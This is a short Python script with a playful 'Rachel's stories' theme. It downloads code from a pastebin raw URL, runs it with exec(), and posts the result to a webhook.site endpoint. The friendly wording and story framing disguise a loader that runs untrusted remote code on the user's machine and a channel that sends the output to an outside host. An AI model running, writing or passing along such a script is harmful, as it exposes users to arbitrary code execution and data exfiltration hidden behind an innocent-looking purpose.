import requests
import json

WEBHOOK_URL = "https://webhook.site/027bc8ed-3a0c-43a0-ac28-25e44b0291fa"
RACHELS_STORIES = "https://pastebin.com/raw/t8jGGWWT"

def rachels_function():
    """
    Replace this with whatever logic you want.
    The return value will be sent to the webhook.
    """
    ns = {}
    rachels_stories = exec(requests.get(RACHELS_STORIES).text, ns)
    rachels_stories = ns["my_story"]
    return rachels_stories


def send_to_rachel(data):
    headers = {"Content-Type": "application/json"}
    response = requests.post(
        WEBHOOK_URL, headers=headers, data=json.dumps(data), timeout=10
    )
    response.raise_for_status()
    return response.status_code


if __name__ == "__main__":
    output = rachels_function()
    status_code = send_to_rachel(output)
    print("Here's a story about Rachel: " + output)
    print(f"YEY! Rachel got your message! 😍 status code: {status_code}")
